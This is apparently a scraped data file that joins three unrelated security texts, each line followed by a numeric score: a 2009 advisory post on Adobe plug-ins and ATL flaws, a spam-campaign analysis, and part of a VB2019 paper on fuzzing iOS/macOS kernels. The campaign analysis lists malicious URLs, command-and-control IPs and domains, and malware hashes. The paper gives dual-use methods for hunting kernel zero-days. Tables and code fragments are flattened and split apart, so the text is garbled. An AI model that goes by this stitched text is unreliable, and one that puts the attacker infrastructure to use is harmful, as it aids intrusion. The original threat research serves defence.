Adobe has issued an important announcement, much of it relating to the impact of vulnerabilities in the Microsoft Active Template Library (ATL)  flagged as CVE-2009-0901, CVE-2009-2395, CVE-2009-2493 and described in Microsoft Security Advisory (973882) on Adobe products used as Internet Explorer plug-ins.  It appears that Flash Player and Shockwave Player “leverage” vulnerable versions of ATL. According to",0.009803410799071988
David Harley,0.00885109592441069
28 Jul 2009 - 10:50AM,0.01137698981365165
"Adobe has issued an important announcement, much of it relating to the impact of vulnerabilities in the Microsoft Active Template Library (ATL)  flagged as CVE-2009-0901, CVE-2009-2395, CVE-2009-2493 and described in Microsoft Security Advisory (973882) on Adobe products used as Internet Explorer plug-ins.  It appears that Flash Player and Shockwave Player “leverage” vulnerable versions of ATL. According to",0.009036669211885395
"Adobe has issued an important announcement, much of it relating to the impact of vulnerabilities in the Microsoft Active Template Library (ATL)  flagged as CVE-2009-0901, CVE-2009-2395, CVE-2009-2493 and described in Microsoft Security Advisory (973882) on Adobe products used as Internet Explorer plug-ins.",0.011729629345578418
It appears that Flash Player and Shockwave Player “leverage” vulnerable versions of ATL.,0.006186262396259412
"According to Adobe, the Adobe Reader browser plug-in for Internet Explorer, Connect Pro, Flash Lite for mobile devices, LiveCycle SAP Forms and other products are not subject to the above vulnerabilities. Flash Player within Firefox and other browsers (apart from IE) do not share the vulnerabilities, and nor do Flash Player and Shockwave Player on Macintosh, Linux and Solaris.",0.01270371265649528
"The latest version of Shockwave Player, which is now available for download (http://get.adobe.com/shockwave), has been patched. The Flash Player vulnerability will be patched in the update due on July 30, 2009.",0.009375405158644212
"Sensibly, Adobe recommend the installation of the MS09-034 security update, which provides mitigation against the vulnerabilities in the relevant versions of ATL.",0.012918881398565563
"David Harley
Director of Malware Intelligence
",0.009035364589518369
"Over the past 24 hours, cybercriminals have launched yet another massive spam run, this time impersonating FedEx in an attempt to trick its customers into clicking on a malware and exploits-serving URL found in the malicious email.
More details:",0.016032403818136975
Screenshot of the spamvertised email:,0.01024206182675269
Screenshot of a sample Java script obfuscation:,0.009631862016331483
"Sample spamvertised URLs: hxxp://www.minskcityguide.net/fedinv.html; hxxp://blacklabelblogs.com/fedinv.html, hxxp://djl3.com/invdex.html; hxxp://arconcommercialfunding.com/wp-content/uploads/fgallery/fedinv.html; hxxp://greenbeltmo.org/fedinv.html; hxxp://upturnbar.com.br/wp-content/uploads/fgallery/fedinv.html
Sample client-side exploits serving URLs: hxxp://studiomonahan.net/main.php?page=2bfd5695763b6536 (200.42.159.6, AS10481; 206.253.164.43, AS6921); hxxp://gsigallery.net/main.php?page=2bfd5695763b6536 (208.91.197.54, AS40034)
Sample client-side exploits served: CVE-2010-1885
Responding to the same IPs is also the following malicious domain – mi-argentina.net.
Name servers part of the campaign’s malicious infrastructure:
ns1.correctcomfort.net – 46.4.145.164, AS24940
ns1.correctcomfort.net – 67.23.237.108, AS33182
ns1.correctcomfort.net – 173.234.9.17, AS15003
ns1.correctcomfort.net – 184.154.103.253, AS32475
More malicious domains are using these name servers, such as, for instance:
centennialfield.net
dushare.net
bowerystore.net
blue-lotusgrove.net
cat-mails.net
nitor-solutions.net
correctcomfort.net
Detection rate for a sample Java script redirector: MD5: 32a74240c7e1a34a2a8ed8749758ef15 – detected by 8 by 41 antivirus scanners as JS/Iframe.FR; Trojan-Downloader.JS.Iframe.dbe; JS/Exploit-Blacole.hd
Upon successful client-side exploitation, the campaign drops MD5: f9904f305de002ad5c0ad4b4648d0ca7 – detected by 23 out of 40 antivirus scanners as Trojan.Win32.Obfuscated.aopm; Worm:Win32/Cridex.E and MD5: 0e2c968865d34c8570bb69aa6156b915 – detected by 24 out of 42 antivirus scanners as Worm.Win32.Cridex.jb
The first sample phones back to 195.111.72.46:8080/mx/5/B/in/ (AS1955) and to 87.120.41.155:8080/mx/5/B/in (AS13147), and the second sample initiates DNS queries to droppinlever.pro; lambolp700tuning.ru and it also produces TCP traffic to 146.185.220.32 on port 443, as well as to 192.5.5.241 again on port 443.
Deja vu! We’ve already seen numerous malicious campaigns phoning back one of these command and control servers, 87.120.41.155:8080/mx/5/B/in in particular. Campaigns known to have also used the same C&C server:",0.012385451036625805
"Intuit themed ‘QuickBooks Update: Urgent’ emails lead to Black Hole exploit kit
Spamvertised ‘Wire Transfer Confirmation’ themed emails lead to Black Hole exploit kit
Spamvertised ‘Fwd: Scan from a Hewlett-Packard ScanJet’ emails lead to Black Hole exploit kit
Spamvertised ‘Federal Tax Payment Rejected’ themed emails lead to Black Hole exploit kit
Cybercriminals spamvertise bogus greeting cards, serve exploits and malware
Cybercriminals impersonate Intuit Market, mass mail millions of exploits and malware serving emails",0.013348962691669741
"Responding to 87.120.41.155 are also the following malicious C&C servers:
cpokemnothviik.ru
insomniacporeed.ru",0.010743823134200081
"Related name servers part of the campaign’s infrastructure:
ns1.cpokemnothviik.ru – 171.25.190.249, AS57683
ns2.cpokemnothviik.ru – 94.63.147.95
ns3.cpokemnothviik.ru – 171.25.190.250
ns4.cpokemnothviik.ru – 94.63.147.96
ns1.insomniacporeed.ru – 62.213.64.161, AS15756
ns2.insomniacporeed.ru – 85.214.204.32, AS6724
ns3.insomniacporeed.ru – 50.57.88.200, AS19994
ns4.insomniacporeed.ru – 184.106.189.124, AS19994
ns5.insomniacporeed.ru – 50.57.43.49",0.019705266690580703
"Responding to three of these IPS (85.214.204.32, 50.57.43.49 and 50.57.88.200 in particular) are also the following malicious domains, part of the campaign’s infrastructure:
ciasamkbnavtknxiko.ru
jbznsadolgrgrlaewo.ru
kblqegxrumlsrefvmb.ru
kogirlsnotcryz.ru
lzngllvmrbwdcpha.ru
messagingonfloor.su
nolwzyzsqkhjkqhomc.ru
pokeronmep.ru
poluicenotgo.ru
qtdlnxbqfohcpwft.ru
validatoronmee.ru
vitalitysomer.ru
yhbyqwmrtqxvmpryon.ru
zvzjxbjwbgguucrbkr.ru
girlsnotcryz.ru
holigaansongeer.ru
immerialtv.ru
mazdaforumi.ru
paranoiknepjet.ru
piloramamoskow.ru
pistolitnameste.ru
puleneprobivaemye.ru
pushkidamki.ru
uzindexation.ru
Webroot SecureAnywhere users are proactively protected from these threats.
You can find more about Dancho Danchev at his LinkedIn Profile. You can also follow him on  Twitter.
",0.011772460443522315
VB2019 paper: Play fuzzing machine – hunting iOS/macOS kernel vulnerabilities automatically and smartly,0.008250426788527276
Lilang Wu & Moony Li,0.009879811035542474
"Trend Micro, China",0.008776768667339674
"Table of contents
Abstract 1. Solution overview 2. Reverse engineering automatically for kernel attack interface 2.1 Kernel and kexts automatic analysis 2.1.1 Class/method names refined through inheritance 2.1.2 Methodology for finding IOKit service connection types and their user client vector 2.1.3 Methodology for finding user client external methods automatically 2.1.3.1 Defined as global or local constant array 2.1.3.2 Defined in the code logic 2.1.4 Implementation for automatic tools 2.1.4.1 Analysis of assembly instructions 2.1.4.2 Parse the kexts Mach-O file 2.1.5 Best practice 2.1.5.1 Assembly instruction set emulation 2.1.5.2 Parse binary contents according different structure 2.2 Kernel and kexts diff analysis 2.2.1 Kernel diff methodology 2.2.2 Driver diff methodology 2.2.3 Best practice 2.2.3.1 Find the user-mode entry for updated functions 2.2.3.2 New attack interfaces introduced by iOS 12 2.2.3.3 New attack interfaces introduced by macOS 10.14 AppleHDA.kext 3. Dynamic analysis for kernel attack interface 3.1 Frida hook in user mode 3.2 Dtrace in kernel mode 3.3 Misc 4. Enhanced passive fuzzing solution 4.1 KASAN in iOS/OSX kernel 4.2 Inline hook and fuzz in kernel 4.3 Future plan 4.3.1 Syzkaller-like fuzzing in kernel mode 4.3.2 Porting KASAN/KMSAN for a closed-source driver 5. Hunt for 0-day vulnerabilities 5.1 CVE-2018-4462 – an integer overflow vulnerability which can leak kernel information found in the AMDFramebuffer driver 5.1.1 Root cause 5.2 Untrusted pointer de-reference issue found in IntelAccelerator 5.2.1 Root cause 5.3 OverFlow issue due to no boundary check in IOUSBFamily extension 5.3.1 Root cause 5.4 Divide zero issue found in AMDRadeonX4000_AMDAccelResource class 5.4.1 Root cause 5.5 OOB read in AMDRadeonX4000 extension 5.5.1 Root cause References",0.01140758263252395
Abstract,0.009485057568311417
"As we all know, Apple’s iOS and MacOS systems have gained much popularity with the huge success of the iPhone and the MacPro. System security vulnerabilities in iOS and MacOS have been developed and abused by hackers, and have also begun to attract more attention from security researchers.",0.018594132752607018
"The more you know about your enemy, the easier it is to defeat him. But how? Since iOS 10, Apple has released the unpacked/decrypted kernel cache (*.ipsw), but the system source code, in particular the kernel and driver part, remain close-sourced. What is more, symbol info in the binary (kernel cache) has been greatly removed, which makes reverse engineering more difficult.",0.012334742918418073
"A challenge means a chance. The truth in security research is that the more attack interface you expose, and the more implementation you do, the greater the probability of finding a zero-day vulnerability. The relatively good news is that, in every iOS/MacOS system update or new hardware release (e.g. the touch bar in MacPro), there is always a lot of change in interface and implementation code (e.g. more selectors exposed in the driver service via IOUserClient).",0.011696347106799565
"Hence, we plan to expose the typical workflow and thinking in order to explore and analyse the new (kernel) attack interface using reverse engineering and dynamic analysis. We will not only share the relative tool chain used to explore the attack interfaces but also the public kernel vulnerability finding system that is based on enhanced passive fuzzing. Finally, we will describe some of the vulnerabilities we have found using these methodologies.",0.014324376453780596
1. Solution overview,0.00882182517457386
"The basic work flow can be separated into the three parts where the architecture or implementation of the iOS/OSX system kernel has potentially changed: identification of attack interfaces using reverse analysis (static analysis), use of dynamic analysis for the kernel attack interface, and use of a passive kernel fuzzing system, accordingly.",0.012828051186595468
"Typically, the occurrence of a change in kernel code would coincide with an iOS/OSX version being released following a public security bulletin(s), Apple adding new hardware equipment (e.g. touch bar equipment for MacOS, A12 CPU update for iPhone, new graphic I/O devices, etc.), and so on.",0.015499353290371332
"After obtaining the whole kernel cache binary, the first step would normally be to identify the modification or new attack interface using reverse engineering. Since we focus on the kernel part in this paper, we should disassemble the Mach-O code in order to identify the driver extension module, classes, external methods, metadata, user clients, system call and other data structures for the kernel attack interface. Moreover, after a XUN and kexts diff and call graphic analysis, the entries list vector for those updated functions, which is used in the following steps, can be obtained quickly and exactly.",0.014568671620280416
"As part of our research, we would like to know not only the module/API information but also the context at runtime when these APIs are called. As the second step of the whole work flow, typically, dynamic analysis would try to get the call stack (with function name symbol and argument value) both in user mode and kernel mode, and determine how an object related to the kernel API is created (e.g. how the service is opened for IoConnectCallMethod), and so on.",0.020373954466260558
"Finally, as the third step, we would carry out (passive) fuzzing of these kernel attack interfaces to hunt for zero-day vulnerabilities. The key to fuzzing system design is to touch as many possible execution paths (or as much code coverage) as possible, and catch the first spot where a vulnerability is triggered. Hence, we try to hook the attack interface in the kernel and fuzz the data passed through from user mode directly to try to ‘touch’ more execution paths after the restriction check. A kernel address sanitizer mechanism is also introduced in order to catch the point of heap/stack overflow, for example.",0.012369933342648354
"As we can see, the static analysis would identify a new attack interface and dynamic analysis would help to trigger it, while the fuzzing system used on the identified attack interface would hunt for new vulnerabilities (kernel panic/crash) to help find more new attack interfaces.",0.016346767958107522
Figure 1: Basic architecture of the solution.,0.01789065075510121
2. Reverse engineering automatically for kernel attack interface,0.007976698782490299
"Figure 2 show the reverse engineering solution for analysis of a macOS/iOS system. The new attack interfaces generator consists mainly of three parts, the work flow of which can be summarized in the following steps:",0.011840180483500995
"The first step is kernel/kexts analysis, which can get all the attack interfaces from a newly released version including UserClient vector, external method interfaces vector, syscall/sysctl interfaces vector and traps/MIGs vector.",0.01086303071578576
"The second step is to diff the XUN project and kexts between two neighbouring versions, which can get the entry list of the updated functions.",0.009202059423517261
The third step is to filter out those entries which cannot be accessed from user space and save the remaining entries which can be accessed directly.,0.008782527479632152
"Finally, these interfaces are collected and saved into a fuzzing corpus database.",0.015274219769069064
Figure 2: The reverse engineering solution for kernel and kextentions.,0.016025836965253726
"For the iOS or macOS kernel and kexts analysis, there are already many open-source tools available in GitHub, as shown in Table 1, but there are still some features that are not available for automatic analysis of the kernel or each kext. We introduce p-joker, which is an automatic tool used to analyse the macOS and iOS core module, the most powerful function of which is to get the service connection types and corresponding UserClients’ external dispatch methods automatically.",0.01463876024323063
Tools,0.009192050920638906
Symbolicate C++ method tables,0.008945454325916202
Class hierarchy,0.009644388148697947
Struct class,0.008566774382609
UserClients and open type,0.007111988807592118
Dispatch method,0.007754877390214632
iokit-utils,0.008215633096927855
N,0.01011405103789298
Y,0.00850609697236615
N,0.01011405103789298
Y (using IOServiceOpen),0.011098609202766396
N,0.01011405103789298
ida_kernelcache,0.008890797208807144
Y,0.00850609697236615
Y,0.00850609697236615
Y,0.00850609697236615
N,0.01011405103789298
N,0.01011405103789298
ioskextdump,0.00932810034473508
Y,0.00850609697236615
Y,0.00850609697236615
N,0.01011405103789298
N,0.01011405103789298
Y(part),0.011356374684692194
Ryuk,0.009100138440923944
Y,0.00850609697236615
N,0.01011405103789298
Y,0.00850609697236615
N,0.01011405103789298
N,0.01011405103789298
p-joker,0.008328467199364642
Y,0.00850609697236615
Y,0.00850609697236615
Y,0.00850609697236615
Y,0.00850609697236615
Y,0.00850609697236615
Table 1: Comparison of open-source tools.,0.01763362786941114
"For the XUN project and kexts implementation diff, we introduce an IDA Pro script, p-diff, which can diff those non-open-source kexts and get a list of changed functions automatically. Then, it analyses the related kext and gets the call graphic for each updated function, and their entry list can be surmised from these calling sequences. In the end, p-diff will reserve those interfaces that can be accessed within a sandbox or by some user-mode privilege process.",0.01087298403742043
2.1 Kernel and kexts automatic analysis,0.00850374093537376
"Figure 3 is an overview of p-joker implementation. Later, we will introduce how to get the service connection type and how to get the dispatch method. As mentioned before, there are many open‑source tools available, so we will simply introduce those with overlapped content.",0.012196389469360414
Figure 3: Overview of the implementation of p-joker.,0.012984856057852268
2.1.1 Class/method names refined through inheritance,0.008545629302316393
"The string symbol was stripped from the release version of the system so, for macOS, we can analyse the kernel and driver contained in the Kernel Debug Kit instead of the release one. However, there are no debug kits available for iOS. So we should refine the method names for each OSObject class, including the instance method table and meta method table. We know all the Apple drivers are implemented in C++, all of the services are inherited from the IOService class. So, through the inherited mechanism, many method names can be inferred from their parent class. Figure 4 shows the IOMobileFramebuffer class and the method table of its parent classes.",0.009744981971512745
Figure 4: Refining the method table for the IOMobileFramebuffer class.,0.015526629487133126
2.1.2 Methodology for finding IOKit service connection types and their user client vector,0.007011165279085074
"The IOKit in the kernel part delivers many MIG interfaces to user space in order to operate different drivers. When one user client is spawned, it should open the corresponding service first. In the user space, the IOServiceOpen function is responsible for spawning the driver’s proxy client according to the given properties dictionary. Figure 5 shows the process to open a service through a MIG interface.",0.01128075592935518
Figure 5: Call graphic of process to open a service in user space.,0.010645628636113513
"During the process to open a service, the system will first call the parent newUserClient method. However, because the IOService class is an abstract class and most of its functions are virtual ones, it will call the subservice that implements it. Figure 6 is an example of spawning an IOFramebuffer user client with connection type 0.",0.012899534964998072
Figure 6: Spawning an IOFramebuffer user client with connection type 1.,0.0061560907763091866
"So, the steps to find the connection tuple as shown in Figure 6 are the following:",0.013333420598362955
Locate the newUserClient function address in the driver.,0.011562230832319886
Enumerate the connection types.,0.01498731267311415
Analyse the instructions to get the corresponding user client for each connection type.,0.01361922250351777
Figure 7: Connection types for IOServiceOpen.,0.0075271003048777985
2.1.3 Methodology for finding user client external methods automatically,0.006752059062464455
"IOUserClient is a subclass of IOService, which provides a basis for communication between client applications and I/O kit objects. Figure 8 shows the process of executing an external method.",0.009786739358411345
Figure 8: ‘ExternalMethod’ function workflow.,0.014896210862428538
"Clients use the ‘IOUserClient::externalMethod’ function to execute external methods. All the external methods are implemented within drivers and can be indexed by selectors. Drivers also define the methods’ input and output conditions, which are used to check the user-mode input or output in coarse-grained user-mode input. For researchers, it is important to find the corresponding selector and conditions for these external methods.",0.014553322895540455
2.1.3.1 Defined as global or local constant array,0.007138815580545632
"Generally, subservices will define this information in the externalMethod override function as a dispatch table that is usually a static constant array. If subservices do not override the externalMethod function, it will be defined in the getTargetAndMethodForIndex function or the getAsyncTargetAndMethodForIndex function, and the dispatch structure will be a little different, as shown in Figure 9.",0.015778586778102066
Figure 9: Defined as local constant array in functions.,0.013036289138692037
"But there are also many SubUserClients declared as global arrays, as shown in Figure 10.",0.013509034560204358
Figure 10: Defined as global constant array in classes.,0.014482195067813342
"Regardless of whether the dispatch table is defined as a local array or a global array, the methodology to find the array is as follows:",0.00987729475242416
Locate the starting address for each constant array in the symbol table.,0.013958118572329092
Parse the contents according to the IOExternalMethodDispatch or IOExternalMethod structure from the starting address.,0.0128101385161703
2.1.3.2 Defined in the code logic,0.008234866298368226
"Some drivers implement the external dispatch method using code logic instead of a constant array, as shown in Figure 11. Therefore, the methodology to find this kind of dispatch is as follows:",0.015092981392671345
Locate the address of the override externalMethod/getTarget…/getAsyncTarget... function.,0.013684081831077943
Analyse assembly instructions to get the selector and external methods.,0.01580239751323198
Figure 11: Defined in switch case.,0.01937071767407006
2.1.4 Implementation for automatic tools,0.008006055464477746
"Depending on the methodology introduced previously, p-joker typically contains two implementation technologies. One emulates the execution of assembly instructions in order to get connection types and external methods implemented by code logic, while the other parses the symbol table in the driver Mach-O file in order to get the dispatch table defined as a constant array.",0.011617854211119716
2.1.4.1 Analysis of assembly instructions,0.009678720944102825
a. Start from scratch,0.010169187703814364
"To analyse or emulate all instructions from scratch is hard, however, the functions we care about use only a small instruction set. Figure 12 shows the assembly of the override newUserClient function.",0.0151249986205928
"To improve the accuracy, the key point is to ensure the correctness of emulation for control flow and data flow. For control flow, as many instructions as possible should be emulated. For data flow, the integrity and accuracy of registers’ data transfer should be ensured. From Listing 1, it can be seen that connection type is the fourth argument, so during the instruction analysis process, it’s important to analyse the control flow depending on ecx/rcx and related registers.",0.017109187185337826
"AppleHDAEngine::newUserClient(AppleHDAEngine *this, task *a2, void *a3, int a4, IOUserClient **a5)",0.014922378109755496
Listing 1: The AppleHDAEngine::newUserClient function.,0.0139396636835728
Figure 12: Assembly of AppleHDAEngine::newUserClient function.,0.013418139539117968
b. Angr or miasm,0.00950091924324381
"As an alternative to starting from scratch, there are some excellent binary analysis tools, such as angr [1] and miasm [2], both of which can emulate the x64 or ARM code. Take miasm for example: not only can it emulate the execution of assembly instructions but it also monitors the value in each register.",0.014473639744463807
"Figure 13 shows the control flow that can be obtained using the miasm tool, after which the corresponding block can be parsed, with the result shown in Figure 14.",0.017569839192734582
Figure 13: Control flow of the AppleHDAEngine::newUserClient function obtained using miasm.,0.013579832613183407
Figure 14: User clients and connection types in the AppleHDA driver.,0.011962419735196628
2.1.4.2 Parse the kexts Mach-O file,0.007040118217080282
"As we know, the constant variables are saved in the symbol table. So, it’s very convenient to parse this table to get the address for each constant array.",0.014772116212598663
Figure 15: Constant variables in the symbol table.,0.01513140867168794
"After getting the address, the binary contents can simply be parsed with the IOExternalMethodDispatch or IOExternalMethod structure. The results are shown in Figure 16.",0.009148535919926704
"In the end, all the user clients with their connection types and external method dispatches can be obtained through these steps, and saved as interface vectors.",0.009175816622636668
Figure 16: External method dispatch of IOFramebufferUserClient.,0.014463355417245083
2.1.5 Best practice,0.008188689201030552
2.1.5.1 Assembly instruction set emulation,0.008534257693463276
"Figure 17 shows the implementation of the mov, cmp, je, jz and test instructions operation. P-joker implements an API set to operate the register. For emulating more operations, the x64 or ARM architecture reference manual [3] can be referenced.",0.02064389843671166
Figure 17: Code snippet for emulating instruction execution from scratch.,0.017469755617836924
2.1.5.2 Parse binary contents according different structure,0.007180124901381424
Figure 18 shows the implementation used to read contents from a Mach-O binary using the IOExternalMethodDispatch or IOExternal structure.,0.012426612924302138
Figure 18: Parsing the binary contents using the corresponding structure.,0.019290822699163823
2.2 Kernel and kexts diff analysis,0.008674824261659775
"Apple has open-sourced its XNU project for both macOS and iOS systems, as well as part of the drivers. For closed-source drivers, automatic reverse engineering methods have already been introduced, therefore all the attack interfaces can be obtained.",0.01192330395950536
"However, in order to find the newest introduced attack interface, researchers need to know which functions have been updated and which services or syscalls are newly added. Once that information has been obtained they also need to know how to access or call these updated or newly added attack interfaces. The following sections will introduce how to find the newly added attack interfaces and list their entry points.",0.01722166104147982
2.2.1 Kernel diff methodology,0.008324042022761824
"MIG interface, syscall, sysctl and traps are implemented in the system kernel. Listing 2 shows their source code in the XNU project.",0.011936516101860417
"xnu-4570.71.2/
|-- bsd
|   `-- kern
|       |-- kern_sysctl.c                //sysctl
|       `-- syscalls.master              //syscall
`-- osfmk
|-- device
|   `-- device.defs                 //mig
|-- kern
|   `-- syscall_sw.c                //traps
`-- mach
`-- mach_traps.h               //traps",0.015766166063768017
Listing 2: Related implementation files in XNU source code.,0.015277020175774703
"1. First, coarse-grained parse and diff these files in order to get the new interfaces. These interfaces include the newly added ones and ones in which arguments have changed. Alternatively, the corresponding information can be obtained directly from the kernel binary diff – there are already many excellent tools available, such as joker [4].",0.011862249576652717
"2. Next, diff all the files in the XNU project and tag those that have been changed or newly added. Ignore unrelated files, such as test code files and deleted files, take BSD VFS.",0.0132396445672891
Figure 19: Difference between the BSD VFS folders.,0.014864550567107226
"3. Next, compile statistics for changed or newly added functions in those files, and the related function name list.",0.013144236004783094
Figure 20: Changed function ‘getvolattrlist ()’ in the vfs_attrlist.c file.,0.012752559301927202
"4. Next, construct the calling sequence for the changed functions and get the entry functions. This step in p-diff is implemented through an IDA Pro script. There are two functions, ‘CodeRefsTo(ea, flow)’ and ‘CodeRefsFrom(ea, flow)’, available in the idautils.py file [5].",0.016310358923600554
Figure 21: Calling sequence of the ‘getvolattrlist ()’ function.,0.013535377257153813
"5. Finally, list the entry functions for each calling sequence, and check if they are interfaces that are exposed to user mode. Table 2 shows the syscalls that can be called from user space. Together with the newly added and changed interfaces, these are the new attack interfaces which should be the main fuzz point.",0.016929903191526208
"220
AUE_GETATTRLIST ALL
{",0.010234781339588883
int,0.010465213695827202
"getattrlist
(
const char",0.009968875492207152
"*
path
,",0.007874867573649524
"struct
attrlist
*
alist
,",0.010005235521532763
void,0.012247394294092162
"*
attributeBuffer
,",0.008141345872928252
"size_t
bufferSize
,
u_long options
)
NO_SYSCALL_STUB
; }",0.011285485694379593
"461
AUE_GETATTRLISTBULK ALL
{",0.010602239199981711
int,0.010465213695827202
"getattrlistbulk
(
int
dirfd
,",0.011325630752819116
"struct
attrlist
*
alist
,",0.010005235521532763
void,0.012247394294092162
"*
attributeBuffer
,",0.008141345872928252
"size_t
bufferSize
,",0.008637360073942113
"uint64_t
options
); }",0.011528855647071956
"228
AUE_FGETATTRLIST ALL
{",0.011225512776007585
int,0.010465213695827202
"fgetattrlist
(
int
fd
,",0.011172912039263294
"struct
attrlist
*
alist
,",0.010005235521532763
void,0.012247394294092162
"*
attributeBuffer
,",0.008141345872928252
"size_t
bufferSize
,
u_long options
); }",0.011958110146757517
"476
AUE_GETATTRLISTAT ALL
{",0.009593854213950204
int,0.010465213695827202
"getattrlistat
(
int
fd
,",0.010205237685291912
const char,0.008691948858660314
"*
path
,",0.007874867573649524
"struct
attrlist
*
alist
,",0.010005235521532763
void,0.012247394294092162
"*
attributeBuffer
,",0.008141345872928252
"size_t
bufferSize
,
u_long options
); }",0.011958110146757517
Table 2: Syscalls obtained from the calling sequence in the fourth step.,0.016048417490345912
"In fact, the example we mentioned is the patch for CVE-2018-4243, which was found by Ian Beer. However, using this methodology, researchers can find the newest attack interface quickly. After that, they can update their fuzz corpus accordingly and discover the potential vulnerabilities introduced by the newly added code.",0.012478898423949114
2.2.2 Driver diff methodology,0.008798158119426525
"Nearly all the drivers on macOS are closed source, however, the methodology is similar. The only difference is that all the diff operations would be based on binary instead of source code. For binary diff, an IDA Pro script can be used with the BinDiff [6] plug-in.",0.014104565174916983
"All drivers on macOS can be found in the ‘/System/Library/Extensions’ folder. A comparison of the same driver’s binary can be made for different versions. But for iOS, all the drivers are pre-compiled within the kernelcache file. Researchers should split all drivers first using p-joker or an existing tool such as joker. However, the format for iOS kernelcache has changed, leading to the existing tools no longer working. Luckily, p-joker supports the new format – we will push the newest p-joker version to GitHub soon.",0.010106998668788059
Figure 22: Diff results using an IDA Pro script.,0.02076694667743262
"The main purpose of driver diff is to find selectors for the newly added external methods and the external method entries for changed functions. This way, we only get those interfaces that can fuzz the updated code effectively and in a timely way.",0.009869259683838005
Figure 23: Find the entry functions list using p-diff.,0.013794058373715279
2.2.3 Best practice,0.008989394481229818
2.2.3.1 Find the user-mode entry for updated functions,0.006604709675346876
"After the calling sequences have been obtained, the main job is to find the user-mode entry that can call them. Figure 24 shows a code snippet of p-diff implementation.",0.012138400831496976
Figure 24: Code snippet of p-diff implementation.,0.01739551066473044
2.2.3.2 New attack interfaces introduced by iOS 12,0.008592162805768577
Some kextensions will have been removed or added in the newest version release. Table 3 shows the updated kernel extensions list.,0.02733027352409645
Drivers,0.007990706789836821
Status,0.008968909949704562
com.apple.driver.ApplePinotLCD,0.008499980245089467
Newly added,0.008379872691719359
com.apple.AppleARM64ErrorHandler,0.011452248079060312
Newly added,0.008379872691719359
com.apple.drivers.AppleS7002SPU,0.010495384113817674
Newly added,0.008379872691719359
com.apple.driver.AppleSMCWirelessCharger,0.008857048077121066
Newly added,0.008379872691719359
com.apple.driver.usb.AppleUSBHub,0.00977429216724468
Newly added,0.008379872691719359
com.apple.AppleSMC_Embedded,0.010613806368529266
Changed,0.007483766720089213
com.apple.AGXFirmwareKextG10P,0.009000178567447725
Changed,0.007483766720089213
com.apple.kext.CoreTrust,0.011372654726857556
Newly added,0.008379872691719359
com.apple.nke.lttp,0.010928654888664346
Newly added,0.008379872691719359
com.apple.iokit.IOUSBHostFamily,0.01035476016684489
Changed,0.007483766720089213
com.apple.driver.BCMWLANFirmware4357_Hashstore,0.009105861751557476
Changed,0.007483766720089213
com.apple.Libm.kext,0.01058710395303808
Changed,0.007483766720089213
com.company.driver.modulename,0.008904286205995926
Newly added,0.008379872691719359
com.apple.AppleHapticsSupportCallan,0.011295996568941535
Newly added,0.008379872691719359
com.apple.driver.AppleCredentialManager,0.011437641831266276
Newly added,0.008379872691719359
com.apple.security.AppleImage4,0.010731140127665517
Newly added,0.008379872691719359
com.apple.AGXFirmwareKextG5P,0.00867650514172369
Changed,0.007483766720089213
com.apple.file-systems.hfs.kext,0.011331298626073516
Changed,0.007483766720089213
com.apple.driver.AppleAVE,0.010026066195025773
Changed,0.007483766720089213
com.apple.iokit.IOReporting,0.009332467690729263
Newly added,0.008379872691719359
com.apple.driver.AppleEmbeddedAudioLibs,0.010570397585884628
Newly added,0.008379872691719359
com.apple.driver.AOPTouchKext,0.00939620418048881
Newly added,0.008379872691719359
com.apple.drivers.AppleS7002SPUSphere,0.010406898176763435
Newly added,0.008379872691719359
Table 3: Updated kextensions in iOS 12.0.1.,0.008593310367272955
2.2.3.3 New attack interfaces introduced by macOS 10.14 AppleHDA.kext,0.010976353153521967
"Due to there being lots of drivers, here we only take the AppleHDA.kext driver as an example. Table 4 shows its external method dispatch details. Table 5 shows the updated functions from macOS 10.13.6 to macOS 10.14, as well as their entry interfaces in user-mode.",0.012309435003120095
Selector,0.014627362358195395
Function name,0.00853587248840404
Scalar InputCount,0.009525418196349111
Structure InputSize,0.009333972883871944
Scalar OutputCount,0.009876509968532288
Structure OutputSize,0.009673148748976623
0,0.00817816293997986
getState,0.008424985632324189
2,0.012344956490214498
0,0.00817816293997986
0,0.00817816293997986
0xfff,0.008514064804205579
1,0.011966970221767848
setState,0.008266335310551431
2,0.012344956490214498
0xfff,0.008514064804205579
0,0.00817816293997986
0,0.00817816293997986
2,0.012344956490214498
resetDSPToPropertyList,0.00943019459073402
0,0.00817816293997986
0,0.00817816293997986
0,0.00817816293997986
0,0.00817816293997986
3,0.009865182153086294
isPortPresent,0.008434845605017727
1,0.011966970221767848
0,0.00817816293997986
1,0.011966970221767848
0,0.00817816293997986
4,0.008739321216238327
getHardwareVolume,0.009584637317666567
0,0.00817816293997986
0,0.00817816293997986
6,0.011048869006257567
0,0.00817816293997986
5,0.018129885769473386
setHardwareVolume,0.008771361186447502
1,0.011966970221767848
0,0.00817816293997986
0,0.00817816293997986
0,0.00817816293997986
6,0.011048869006257567
getActiveSpatialChannels,0.010372019651798015
0,0.00817816293997986
0,0.00817816293997986
0x10,0.007969195617950287
0,0.00817816293997986
7,0.01923895472649928
getAudioSnoopEnabled,0.01040237230201524
0,0.00817816293997986
0,0.00817816293997986
3,0.009865182153086294
0,0.00817816293997986
8,0.016002200265574196
setAudioSnoopEnabled,0.010140768130511457
3,0.009865182153086294
0,0.00817816293997986
0,0.00817816293997986
0,0.00817816293997986
9,0.013212450000046227
setSpatialChannelMute,0.010467629033160342
2,0.012344956490214498
0,0.00817816293997986
0,0.00817816293997986
0,0.00817816293997986
Table 4: External method dispatch details for AppleHDA.kext in macOS 10.14.,0.008285305970781698
"P-Diff: entry functions for function AppleHDAEngine::resetVolumeFromVolumeCacheForAppleHDAPathSet(AppleHDAPathSet)
AppleHDAEngineUserClient::setStateAction(UserClientData)",0.015113668205613107
"P-Diff: entry functions for function AppleHDAEngine::resetSoftwareVolumeFromVolumeCacheForAppleHDAPathSet(
AppleHDAPathSet)",0.014237326146205542
AppleHDAEngineUserClient::setStateAction(UserClientData),0.014502719037805867
P-Diff: entry functions for function AppleHDAPath::isWidgetAmplifierMuteCapable(),0.008704488239592134
"AppleHDAEngineUserClient::setSpatialChannelMute()
AppleHDAEngineUserClient::setStateAction(UserClientData)",0.014984475702670252
P-Diff: entry functions for function AppleHDAPath::isWidgetAmplifierGainAdjustable(),0.008969559845951824
"AppleHDAEngineUserClient::getHardwareVolume()
AppleHDAEngineUserClient::getStateAction(UserClientData)
AppleHDAEngineUserClient::setHardwareVolume()
AppleHDAEngineUserClient::setStateAction(UserClientData)",0.018923979542989633
P-Diff: entry functions for function AppleHDAPath::getWidgetAmplifierGainRange(),0.008776427738349857
"AppleHDAEngineUserClient::getHardwareVolume()
